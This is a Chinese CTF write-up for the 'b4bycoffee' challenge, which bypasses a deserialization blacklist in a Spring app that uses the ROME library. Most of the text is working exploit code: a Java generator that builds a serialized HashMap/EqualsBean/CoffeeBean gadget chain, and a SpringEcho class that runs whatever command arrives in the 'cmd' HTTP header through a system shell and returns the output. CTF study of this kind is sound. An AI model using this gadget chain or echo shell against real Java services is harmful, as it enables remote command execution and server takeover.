# [长城杯 2022 高校组]b4bycoffee

复现地址👉[NSSCTF - [长城杯 2022 高校组\]b4bycoffee (ctfer.vip)](https://www.ctfer.vip/problem/3454)

查看POM文件，存在ROME依赖

```xml
<dependency>
    <groupId>com.rometools</groupId>
    <artifactId>rome</artifactId>
    <version>1.7.0</version>
</dependency>
```

```java
@RequestMapping({"/b4by/coffee"})
    public Message order(@RequestBody CoffeeRequest coffee){
        if (coffee.Venti != null) {
            InputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(coffee.Venti));
            AntObjectInputStream antInputStream = new AntObjectInputStream(inputStream);
            Venti venti = (Venti)antInputStream.readObject();
            return new Message(200, venti.getcoffeeName());
        } // ...
    }
```

`AntObjectInputStream`是自定义的对象输入流类，维护了一个黑名单

我们知道`ObjectInputStream#resolveClass`用于加载类，其默认实现实际就是调用了`Class.forName(name, false,loader)`。`readObject`需要经过`resolveClass`

`AntObjectInputStream`禁用了ROME利用链的关键类`ToStringBean`，`ToStringBean#toString`能够调用类的getter方法。

```java
public class AntObjectInputStream extends ObjectInputStream {
    private List<String> list = new ArrayList();

    public AntObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
        this.list.add(BadAttributeValueExpException.class.getName());
        this.list.add(ObjectBean.class.getName());
        this.list.add(ToStringBean.class.getName());
        this.list.add(TemplatesImpl.class.getName());
        this.list.add(Runtime.class.getName());
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (this.list.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        } else {
            return super.resolveClass(desc);
        }
    }
}
```

题目断掉`ToStringBean`这个类的同时，又给我们打开了一个可以利用的类

```java
public class CoffeeBean extends ClassLoader implements Serializable {
    private String name = "Coffee bean";
    private byte[] ClassByte;

    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public CoffeeBean() {
    }

    public String toString() {
        CoffeeBean coffeeBean = new CoffeeBean();
        Class clazz = coffeeBean.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length);
        Object var3 = null;

        try {
            var3 = clazz.newInstance();
        } catch (InstantiationException var5) {
            var5.printStackTrace();
        } catch (IllegalAccessException var6) {
            var6.printStackTrace();
        }

        return "A cup of Coffee --";
    }
}
```

啊这不就是`ToStringBean`和`TemplatesImpl`的结合体吗

`HashMap#radObject` =>  `EqualsBean#hashCode` => `toString()`

注意生成payload时，`CoffeeBean`的包路径要和源文件的一样

```java
import com.example.b4bycoffee.model.CoffeeBean;
import com.rometools.rome.feed.impl.EqualsBean;
import javassist.ClassPool;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class GetPayload {
    public static void setFieldValue(Object obj, String fieldName, Object newValue) throws Exception {
        Class clazz = obj.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, newValue);
    }
    public static String getPayLoad() throws Exception {
        byte[] code = ClassPool.getDefault().get(SpringEcho.class.getName()).toBytecode();
        CoffeeBean coffeeBean = new CoffeeBean();
        setFieldValue(coffeeBean, "ClassByte", code);

        EqualsBean equalsBean = new EqualsBean(String.class, "test");

        HashMap map = new HashMap();
        map.put(equalsBean, "p4d0rn");
        setFieldValue(equalsBean, "obj", coffeeBean);
        setFieldValue(equalsBean, "beanClass", CoffeeBean.class);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();

        String payload = new String(Base64.getEncoder().encode(baos.toByteArray()));
        System.out.println(payload);
        return payload;
    }

    public static void main(String[] args) throws Exception {
        getPayLoad();
    }
}
```

网上找的Spring下的回显类

```java
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho {
    static {
        try {
            Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method m = c.getMethod("getRequestAttributes");
            Object o = m.invoke(null);
            c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            m = c.getMethod("getResponse");
            Method m1 = c.getMethod("getRequest");
            Object resp = m.invoke(o);
            Object req = m1.invoke(o); // HttpServletRequest
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
            getHeader.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(resp);
            String cmd = (String)getHeader.invoke(req, "cmd");
            String[] commands = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = cmd;
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream()).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        } catch (Exception e) {

        }

    }
}
```

🤧本地jar包运行起来可以打，怎么复现环境打不了👊